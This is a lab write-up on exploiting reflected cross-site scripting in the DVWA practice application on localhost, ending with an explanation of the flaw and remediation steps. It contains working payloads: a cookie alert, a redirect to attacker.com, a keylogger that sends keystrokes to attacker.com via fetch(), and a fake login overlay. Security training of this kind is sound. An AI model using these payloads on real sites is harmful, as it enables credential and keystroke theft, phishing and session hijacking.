# DVWA Lab — Reflected Cross-Site Scripting (XSS)

## Objective
Exploit Reflected XSS vulnerability in DVWA to execute JavaScript
in victim's browser and demonstrate session hijacking potential.

## Environment
- Target: DVWA running on localhost
- URL: http://localhost/DVWA
- Login: admin / password
- Security Level: Low

## Steps

### 1. Access Reflected XSS Module
- Login to DVWA
- Navigate to: Vulnerabilities → XSS (Reflected)

### 2. Test for XSS Vulnerability
Input: `<script>alert('XSS Vulnerability Found')</script>`
Result: Alert box pops up — XSS confirmed ✅

### 3. Extract Cookies (Session Hijacking)
Input: `<script>alert(document.cookie)</script>`
Result: Session cookies displayed in alert box

### 4. Redirect to Attacker Site
Input: `<script>window.location='http://attacker.com/steal'</script>`
Result: Page redirects to malicious site

### 5. Keylogger Injection
Input: `<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>`
Result: Every keystroke sent to attacker's server

### 6. Create Phishing Form Overlay
Input: `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;"><form style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;"><input type="text" placeholder="Username"><input type="password" placeholder="Password"><button>Login</button></form></div>`
Result: Fake login form overlays real page

## Vulnerability Explanation
User input is reflected directly into the HTML response
without sanitization or encoding.

Vulnerable code:
```php
echo "Hello " . $_GET['name'];
```

With input: `<script>alert('XSS')</script>`
Output: `Hello <script>alert('XSS')</script>`

Browser executes the JavaScript.

## Impact
- Session hijacking (steal cookies/tokens)
- Credential theft
- Malware distribution
- Defacement
- Phishing attacks
- CSRF attacks on behalf of user

## Difference: Reflected vs Stored
- **Reflected XSS**: Payload in URL, not stored, requires user to click link
- **Stored XSS**: Payload saved in database, affects all users who view it

## Remediation
- HTML encode output
- Use Content Security Policy (CSP)
- Validate and sanitize input
- Use templating engines with auto-escaping
- HttpOnly and Secure flags on cookies

## Tools Used
- DVWA
- Web Browser DevTools
- JavaScript knowledge

## Status
✅ Successfully exploited Reflected XSS - Browser code execution achieved
